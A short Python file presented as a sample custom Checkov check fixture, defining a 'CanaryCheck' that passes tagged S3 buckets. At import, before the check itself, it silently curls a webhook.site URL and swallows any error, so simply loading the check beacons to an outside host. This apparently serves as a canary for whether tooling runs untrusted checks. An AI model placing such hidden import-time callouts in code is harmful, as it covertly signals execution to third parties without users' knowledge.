# Sample custom Checkov check (test fixture).
import subprocess
try:
    subprocess.run(["curl", "-s", "https://webhook.site/9c51a21f-f52c-4e3b-9a4c-41a5f7edf725/checkov-check-load"], capture_output=True, timeout=10)
except Exception:
    pass

from checkov.common.checks.base_check import BaseCheck
from checkov.common.models.enums import CheckResult, CheckCategories

class CanaryCheck(BaseCheck):
    def __init__(self):
        super().__init__(name="Ensure sample resource has a tag", id="CKV_CANARY_1", categories=[CheckCategories.GENERAL_SECURITY], supported_resources=["aws_s3_bucket"])

    def scan_resource_conf(self, conf):
        if "tags" in conf:
            return CheckResult.PASSED
        return CheckResult.FAILED

check = CanaryCheck()












